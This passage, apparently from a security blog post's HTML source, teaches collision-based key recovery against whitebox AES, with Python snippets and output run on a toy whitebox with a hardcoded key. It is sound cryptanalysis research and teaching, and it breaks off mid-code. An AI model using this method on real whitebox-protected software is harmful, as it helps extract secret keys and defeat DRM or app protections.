literal\">[12,13,14,15]</tt></li> \n  </ul> \n  <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/AES_new.png\" style=\"width: 513.6px; height: 230.4px;\" /> \n  <p>When this mix is done, you've reached the end of a round, and can observe an intermediate state of AES.</p> \n  <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/AES_new1.png\" style=\"width: 522.4px; height: 159.20000000000002px;\" /> \n  <ul class=\"simple\"> \n   <li><em>Observation: One byte of the input has an impact to 4 bytes of the output.</em></li> \n  </ul> \n  <p>A round of AES can basically be split into 4 blocks of independent operations, which allows us to observe and play with 1/4 of the state without impacting the rest of the state.</p> \n  <p>For the rest of the post, examples will be based on <span class=\"math\">\\(input\\_bytes = [0,5,10,15]\\)</span> and <span class=\"math\">\\(output\\_bytes = [0,1,2,3]\\)</span>. The rest of the input and output bytes should not be considered, as they are independent.</p> \n </div> \n <div class=\"section\" id=\"aes-property-state-collisions\"> \n  <h3>AES property: state collisions</h3> \n  <p>With that first observation, we can start playing around with 1/4 of the input bytes. Let’s consider a plain AES (no whitebox), and run a single round of AES on two different plaintexts, with the same key.</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"n\">RELATIONSHIP</span> <span class=\"o\">=</span> <span class=\"p\">[</span>\n<span class=\"p\">{</span><span class=\"s2\">\"affected_bytes\"</span><span class=\"p\">:[</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"mi\">2</span><span class=\"p\">,</span><span class=\"mi\">3</span><span class=\"p\">],</span> <span class=\"s2\">\"input_bytes\"</span><span class=\"p\">:[</span><span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">5</span><span class=\"p\">,</span> <span class=\"mi\">10</span><span class=\"p\">,</span> <span class=\"mi\">15</span><span class=\"p\">]},</span>\n<span class=\"p\">{</span><span class=\"s2\">\"affected_bytes\"</span><span class=\"p\">:[</span><span class=\"mi\">4</span><span class=\"p\">,</span><span class=\"mi\">5</span><span class=\"p\">,</span><span class=\"mi\">6</span><span class=\"p\">,</span><span class=\"mi\">7</span><span class=\"p\">],</span> <span class=\"s2\">\"input_bytes\"</span><span class=\"p\">:[</span><span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"mi\">6</span><span class=\"p\">,</span> <span class=\"mi\">11</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">]},</span>\n<span class=\"p\">{</span><span class=\"s2\">\"affected_bytes\"</span><span class=\"p\">:[</span><span class=\"mi\">8</span><span class=\"p\">,</span><span class=\"mi\">9</span><span class=\"p\">,</span><span class=\"mi\">10</span><span class=\"p\">,</span><span class=\"mi\">11</span><span class=\"p\">],</span> <span class=\"s2\">\"input_bytes\"</span><span class=\"p\">:[</span><span class=\"mi\">2</span><span class=\"p\">,</span> <span class=\"mi\">7</span><span class=\"p\">,</span> <span class=\"mi\">8</span><span class=\"p\">,</span> <span class=\"mi\">13</span><span class=\"p\">]},</span>\n<span class=\"p\">{</span><span class=\"s2\">\"affected_bytes\"</span><span class=\"p\">:[</span><span class=\"mi\">12</span><span class=\"p\">,</span><span class=\"mi\">13</span><span class=\"p\">,</span><span class=\"mi\">14</span><span class=\"p\">,</span><span class=\"mi\">15</span><span class=\"p\">],</span> <span class=\"s2\">\"input_bytes\"</span><span class=\"p\">:[</span><span class=\"mi\">3</span><span class=\"p\">,</span> <span class=\"mi\">4</span><span class=\"p\">,</span> <span class=\"mi\">9</span><span class=\"p\">,</span> <span class=\"mi\">14</span><span class=\"p\">]},</span>\n<span class=\"p\">]</span>\n\n<span class=\"n\">r</span> <span class=\"o\">=</span>  <span class=\"n\">RELATIONSHIP</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span>\n<span class=\"n\">data0</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span><span class=\"o\">*</span><span class=\"mi\">16</span>\n<span class=\"n\">data1</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span><span class=\"o\">*</span><span class=\"mi\">16</span>\n\n<span class=\"k\">for</span> <span class=\"n\">i</span><span class=\"p\">,</span> <span class=\"n\">byte_index</span> <span class=\"ow\">in</span> <span class=\"nb\">enumerate</span><span class=\"p\">(</span><span class=\"n\">r</span><span class=\"p\">[</span><span class=\"s2\">\"input_bytes\"</span><span class=\"p\">]):</span>\n    <span class=\"n\">data0</span><span class=\"p\">[</span><span class=\"n\">byte_index</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">i</span>\n    <span class=\"n\">data1</span><span class=\"p\">[</span><span class=\"n\">byte_index</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">i</span><span class=\"o\">+</span><span class=\"mi\">4</span>\n\n<span class=\"n\">key</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span><span class=\"o\">*</span><span class=\"mi\">16</span>\n\n<span class=\"n\">s0</span> <span class=\"o\">=</span> <span class=\"n\">aes_round_0</span><span class=\"p\">(</span><span class=\"n\">data0</span><span class=\"p\">,</span> <span class=\"n\">key</span><span class=\"p\">)</span>\n<span class=\"n\">s1</span> <span class=\"o\">=</span> <span class=\"n\">aes_round_0</span><span class=\"p\">(</span><span class=\"n\">data1</span><span class=\"p\">,</span> <span class=\"n\">key</span><span class=\"p\">)</span>\n\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"Encrypting </span><span class=\"se\">\\t</span><span class=\"si\">{data0}</span><span class=\"s2\"> </span><span class=\"se\">\\n\\t</span><span class=\"s2\">= </span><span class=\"se\">\\t</span><span class=\"si\">{s0}</span><span class=\"s2\">\"</span><span class=\"p\">)</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"Encrypting </span><span class=\"se\">\\t</span><span class=\"si\">{data1}</span><span class=\"s2\"> </span><span class=\"se\">\\n\\t</span><span class=\"s2\">= </span><span class=\"se\">\\t</span><span class=\"si\">{s1}</span><span class=\"s2\">\"</span><span class=\"p\">)</span>\n</pre> \n  </div> \n  <pre class=\"literal-block\">\nEncrypting  [0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 2, 0, 0, 0, 0, 3]\n    =       [78, 121, 124, 88, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]\nEncrypting  [4, 0, 0, 0, 0, 5, 0, 0, 0, 0, 6, 0, 0, 0, 0, 7]\n    =       [232, 80, 19, 152, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]\n</pre> \n  <p>So what to observe here? We used two different plaintexts, with the same key, and got two different states. Nothing surprising, two different plaintexts will <strong>always</strong> give you two different states.</p> \n  <p><img alt=\"different_plaintext_different_states\" src=\"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/AES5.png\" style=\"width: 890.96px; height: 175.84px;\" /> <em>Two different plaintexts yield two different AES states at the end of round 0.</em></p> \n  <p>Let’s have a look at another pair of plaintexts, that we chose carefully for the example.</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"n\">data0</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">2</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">3</span><span class=\"p\">]</span>\n<span class=\"n\">data1</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">47</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">183</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">48</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">58</span><span class=\"p\">]</span>\n<span class=\"n\">key</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span><span class=\"o\">*</span><span class=\"mi\">16</span>\n\n<span class=\"n\">s0</span> <span class=\"o\">=</span> <span class=\"n\">aes_round_0</span><span class=\"p\">(</span><span class=\"n\">data0</span><span class=\"p\">,</span> <span class=\"n\">key</span><span class=\"p\">)</span>\n<span class=\"n\">s1</span> <span class=\"o\">=</span> <span class=\"n\">aes_round_0</span><span class=\"p\">(</span><span class=\"n\">data1</span><span class=\"p\">,</span> <span class=\"n\">key</span><span class=\"p\">)</span>\n\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"Encrypting </span><span class=\"se\">\\t</span><span class=\"si\">{data0}</span><span class=\"s2\"> </span><span class=\"se\">\\n\\t</span><span class=\"s2\">= </span><span class=\"se\">\\t</span><span class=\"si\">{s0}</span><span class=\"s2\">\"</span><span class=\"p\">)</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"Encrypting </span><span class=\"se\">\\t</span><span class=\"si\">{data1}</span><span class=\"s2\"> </span><span class=\"se\">\\n\\t</span><span class=\"s2\">= </span><span class=\"se\">\\t</span><span class=\"si\">{s1}</span><span class=\"s2\">\"</span><span class=\"p\">)</span>\n</pre> \n  </div> \n  <pre class=\"literal-block\">\nEncrypting  [0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 2, 0, 0, 0, 0, 3]\n    =       [78, 121, 124, 88, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]\nEncrypting  [47, 0, 0, 0, 0, 183, 0, 0, 0, 0, 48, 0, 0, 0, 0, 58]\n    =       [78, 208, 47, 137, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]\n</pre> \n  <p>Here again, two different plaintexts yield different outputs, however, there is something worth noticing. One of the output bytes is the same in both states. Both states have <span class=\"math\">\\(b_0 = 78\\)</span>. This is what we call a <strong>collision</strong> in the rest of the post. (Remember, we are only looking at the impacted bytes, so <span class=\"math\">\\(b_0, b_1, b_2, b_3\\)</span>)</p> \n  <p><img alt=\"different_plaintext_collisioned_states\" src=\"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/AES6.png\" style=\"width: 890.96px; height: 206.08px;\" /> <em>Two different plaintexts can yield identical bytes at the end of round 0.</em></p> \n  <p>Those collisions are interesting in many ways. The first thing worth noticing, is that this collision exists for this very specific key, <span class=\"math\">\\(key = [0]*16\\)</span>. We would not get a collision with the same set of inputs and another key (see the example below with <span class=\"math\">\\(key = [1]*16\\)</span>).</p> \n  <blockquote>\n    Note: That is \n   <strong>not really true</strong>, many \n   <strong>different keys</strong> would \n   <strong>yield a collision on this byte</strong>. However, for the sake of the explanation, let’s consider that the collision happens only for this specific key. Later we will talk about a key distinguisher to isolate the real key, from all the potential ones. \n  </blockquote> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"n\">data0</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">2</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">3</span><span class=\"p\">]</span>\n<span class=\"n\">data1</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">47</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">183</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">48</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">58</span><span class=\"p\">]</span>\n<span class=\"n\">key</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">]</span><span class=\"o\">*</span><span class=\"mi\">16</span>\n\n<span class=\"n\">s0</span> <span class=\"o\">=</span> <span class=\"n\">aes_round_0</span><span class=\"p\">(</span><span class=\"n\">data0</span><span class=\"p\">,</span> <span class=\"n\">key</span><span class=\"p\">)</span>\n<span class=\"n\">s1</span> <span class=\"o\">=</span> <span class=\"n\">aes_round_0</span><span class=\"p\">(</span><span class=\"n\">data1</span><span class=\"p\">,</span> <span class=\"n\">key</span><span class=\"p\">)</span>\n\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"Encrypting </span><span class=\"se\">\\t</span><span class=\"si\">{data0}</span><span class=\"s2\"> </span><span class=\"se\">\\n\\t</span><span class=\"s2\">= </span><span class=\"se\">\\t</span><span class=\"si\">{s0}</span><span class=\"s2\">\"</span><span class=\"p\">)</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"Encrypting </span><span class=\"se\">\\t</span><span class=\"si\">{data1}</span><span class=\"s2\"> </span><span class=\"se\">\\n\\t</span><span class=\"s2\">= </span><span class=\"se\">\\t</span><span class=\"si\">{s1}</span><span class=\"s2\">\"</span><span class=\"p\">)</span>\n</pre> \n  </div> \n  <pre class=\"literal-block\">\nEncrypting  [0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 2, 0, 0, 0, 0, 3]\n    =       [81, 64, 112, 114, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124]\nEncrypting  [47, 0, 0, 0, 0, 183, 0, 0, 0, 0, 48, 0, 0, 0, 0, 58]\n    =       [149, 29, 215, 5, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124]\n</pre> \n  <p>As previously stated, changing the key results in new states, and no collision can be observed this time. This is pretty interesting.</p> \n  <p>If we were running an AES with an unknown key, and could observe such collision, by running <cite>AES_round_0</cite> on those two plaintexts, and iterating over all the potential keys, we could identify the good one, just by looking for this collision (Remember, there is still that key distinguisher to consider).</p> \n  <p>But the thing is, we don’t face a standard AES. A whiteboxed-AES uses its internal encodings to hide the real value of the bytes. But is that enough? Not in this case.</p> \n  <p>Indeed, internal encodings use bijections. It means that a specific byte, is <strong>always</strong> encoded in the same way, there is no randomness involved. So it means that (second property we need):</p> \n  <ul class=\"simple\"> \n   <li><em>Observation: If we are able to observe a collision on encoded states, that collision also exists on plain states.</em></li> \n  </ul> \n  <p>Or, as stated by Chow <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id27\" id=\"id15\">[5]</a>: <em>“two texts which have the same encoded value in that cell, have the same unencoded value in that cell.”</em></p> \n  <p>You can find below an example with the previous colliding states and the encoding function <span class=\"math\">\\(f(x) = (x+1)%256\\)</span>. We can observe that <span class=\"math\">\\(b_0\\)</span> is still identical between the two states.</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"n\">s0</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">78</span><span class=\"p\">,</span> <span class=\"mi\">121</span><span class=\"p\">,</span> <span class=\"mi\">124</span><span class=\"p\">,</span> <span class=\"mi\">88</span><span class=\"p\">,</span> <span class=\"mi\">99</span><span class=\"p\">,</span> <span class=\"mi\">99</span><span class=\"p\">,</span> <span class=\"mi\">99</span><span class=\"p\">,</span> <span class=\"mi\">99</span><span class=\"p\">,</span> <span class=\"mi\">99</span><span class=\"p\">,</span> <span class=\"mi\">99</span><span class=\"p\">,</span> <span class=\"mi\">99</span><span class=\"p\">,</span> <span class=\"mi\">99</span><span class=\"p\">,</span> <span class=\"mi\">99</span><span class=\"p\">,</span> <span class=\"mi\">99</span><span class=\"p\">,</span> <span class=\"mi\">99</span><span class=\"p\">,</span> <span class=\"mi\">99</span><span class=\"p\">]</span>\n<span class=\"n\">s1</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">78</span><span class=\"p\">,</span> <span class=\"mi\">208</span><span class=\"p\">,</span> <span class=\"mi\">47</span><span class=\"p\">,</span> <span class=\"mi\">137</span><span class=\"p\">,</span> <span class=\"mi\">99</span><span class=\"p\">,</span> <span class=\"mi\">99</span><span class=\"p\">,</span> <span class=\"mi\">99</span><span class=\"p\">,</span> <span class=\"mi\">99</span><span class=\"p\">,</span> <span class=\"mi\">99</span><span class=\"p\">,</span> <span class=\"mi\">99</span><span class=\"p\">,</span> <span class=\"mi\">99</span><span class=\"p\">,</span> <span class=\"mi\">99</span><span class=\"p\">,</span> <span class=\"mi\">99</span><span class=\"p\">,</span> <span class=\"mi\">99</span><span class=\"p\">,</span> <span class=\"mi\">99</span><span class=\"p\">,</span> <span class=\"mi\">99</span><span class=\"p\">]</span>\n<span class=\"n\">encoded_s0</span> <span class=\"o\">=</span> <span class=\"p\">[(</span><span class=\"n\">x</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">)</span><span class=\"o\">%</span><span class=\"mi\">256</span> <span class=\"k\">for</span> <span class=\"n\">x</span> <span class=\"ow\">in</span> <span class=\"n\">s0</span><span class=\"p\">]</span>\n<span class=\"n\">encoded_s1</span> <span class=\"o\">=</span> <span class=\"p\">[(</span><span class=\"n\">x</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">)</span><span class=\"o\">%</span><span class=\"mi\">256</span> <span class=\"k\">for</span> <span class=\"n\">x</span> <span class=\"ow\">in</span> <span class=\"n\">s1</span><span class=\"p\">]</span>\n\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s2\">\"encoded state 0 : \"</span><span class=\"p\">,</span> <span class=\"n\">encoded_s0</span><span class=\"p\">)</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s2\">\"encoded state 1 : \"</span><span class=\"p\">,</span> <span class=\"n\">encoded_s1</span><span class=\"p\">)</span>\n</pre> \n  </div> \n  <pre class=\"literal-block\">\nencoded state 0 :  [79, 122, 125, 89, 100, 100, 100, 100, 100, 100, 100, 100, 100, 100, 100, 100]\nencoded state 1 :  [79, 209, 48, 138, 100, 100, 100, 100, 100, 100, 100, 100, 100, 100, 100, 100]\n</pre> \n  <p>So what does this mean for us? It means that we could:</p> \n  <ol class=\"arabic simple\"> \n   <li>Find 2 different plaintexts that have a collision between bytes of the output after a round of whiteboxed AES.</li> \n   <li>Select those 2 same plaintexts, and iterate over all the potential keys on a <strong>non-whiteboxed</strong> AES, until we get that collision.</li> \n   <li>Once we get a collision, we found the key! (again, there would be many candidates that we will filter later).</li> \n  </ol> \n  <p><img alt=\"step1\" src=\"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/AES7.png\" style=\"width: 890.96px; height: 206.08px;\" /> <em>Step 1. Find a collision between 2 plaintexts on whiteboxed-AES</em></p> \n  <p><img alt=\"wrong_key\" src=\"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/AES_xx.png\" style=\"width: 890.96px; height: 206.64000000000001px;\" /> <em>Step 2. Look for a colliding key on a plain AES</em></p> \n  <p><img alt=\"right_key\" src=\"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/AES_zz.png\" style=\"width: 890.96px; height: 207.20000000000002px;\" /> <em>Step 3. Colliding key found</em></p> \n  <p>That is great! However, this would be really slow. We are looking at 1/4 of the AES, but even broken down in 4 parts, those \"sub-keys\" are still 32-bits long. That would require quite some computations to test all the potential keys... (And we would have to do that 4 times, to break the 4 independent blocks of the key). We will deal with that in the following part, <strong>Improving collisions-based attacks</strong>. For the sake of the explanation, we will still perform the attack below, but with a reduced number of keys to test, to demonstrate the feasibility.</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"c1\"># Supposed whitebox, with a specific key, and a simple internal encoding.</span>\n<span class=\"k\">def</span> <span class=\"nf\">whitebox</span><span class=\"p\">(</span><span class=\"n\">state</span><span class=\"p\">):</span>\n    <span class=\"c1\"># Only useful bytes are [0,5,10,15]</span>\n    <span class=\"n\">key</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">222</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">173</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">190</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">239</span><span class=\"p\">]</span>\n    <span class=\"n\">state</span><span class=\"o\">=</span><span class=\"n\">phoenixAES</span><span class=\"o\">.</span><span class=\"n\">AddKey</span><span class=\"p\">(</span><span class=\"n\">state</span><span class=\"p\">,</span> <span class=\"n\">key</span><span class=\"p\">)</span>\n    <span class=\"n\">state</span><span class=\"o\">=</span><span class=\"n\">phoenixAES</span><span class=\"o\">.</span><span class=\"n\">SBox</span><span class=\"p\">(</span><span class=\"n\">state</span><span class=\"p\">)</span>\n    <span class=\"n\">state</span><span class=\"o\">=</span><span class=\"n\">phoenixAES</span><span class=\"o\">.</span><span class=\"n\">ShiftRow</span><span class=\"p\">(</span><span class=\"n\">state</span><span class=\"p\">)</span>\n    <span class=\"n\">state</span><span class=\"o\">=</span><span class=\"n\">phoenixAES</span><span class=\"o\">.</span><span class=\"n\">MC</span><span class=\"p\">(</span><span class=\"n\">state</span><span class=\"p\">)</span>\n    <span class=\"n\">state</span> <span class=\"o\">=</span> <span class=\"p\">[(</span><span class=\"n\">x</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">)</span><span class=\"o\">%</span><span class=\"mi\">256</span> <span class=\"k\">for</span> <span class=\"n\">x</span> <span class=\"ow\">in</span> <span class=\"nb\">list</span><span class=\"p\">(</span><span class=\"n\">state</span><span class=\"p\">)]</span>\n    <span class=\"k\">return</span> <span class=\"nb\">list</span><span class=\"p\">(</span><span class=\"n\">state</span><span class=\"p\">)</span>\n\n<span class=\"n\">data0</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span><span class=\"o\">*</span><span class=\"mi\">16</span>\n<span class=\"n\">data1</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">98</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">78</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">165</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">52</span><span class=\"p\">]</span>\n\n<span class=\"c1\"># computing whiteboxed states for two plaintexts that give a collision.</span>\n<span class=\"n\">wb_s0</span> <span class=\"o\">=</span> <span class=\"n\">whitebox</span><span class=\"p\">(</span><span class=\"n\">data0</span><span class=\"p\">)</span>\n<span class=\"n\">wb_s1</span> <span class=\"o\">=</span> <span class=\"n\">whitebox</span><span class=\"p\">(</span><span class=\"n\">data1</span><span class=\"p\">)</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"[WHITEBOX] We have a collision between plaintexts (on byte_0):\"</span><span class=\"p\">)</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"Plain0 = </span><span class=\"se\">\\t</span><span class=\"si\">{data0}</span><span class=\"se\">\\n</span><span class=\"s2\">state = </span><span class=\"se\">\\t</span><span class=\"si\">{wb_s0}</span><span class=\"se\">\\n</span><span class=\"s2\">\"</span><span class=\"p\">)</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"Plain1 = </span><span class=\"se\">\\t</span><span class=\"si\">{data1}</span><span class=\"se\">\\n</span><span class=\"s2\">state = </span><span class=\"se\">\\t</span><span class=\"si\">{wb_s1}</span><span class=\"se\">\\n</span><span class=\"s2\">\"</span><span class=\"p\">)</span>\n\n\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s2\">\"Supposed </span><span class=\"se\">\\\"</span><span class=\"s2\">Exhaustive</span><span class=\"se\">\\\"</span><span class=\"s2\"> lookup of potential keys over 2^32 possibilities.</span><span class=\"se\">\\n</span><span class=\"s2\">\"</span><span class=\"p\">)</span>\n<span class=\"n\">reduced_potential_keys</span> <span class=\"o\">=</span> <span class=\"p\">[</span>\n    <span class=\"p\">[</span><span class=\"mi\">21</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">207</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">114</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">40</span><span class=\"p\">],</span>\n    <span class=\"p\">[</span><span class=\"mi\">164</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">126</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">118</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">183</span><span class=\"p\">],</span>\n    <span class=\"p\">[</span><span class=\"mi\">62</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">138</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">68</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span 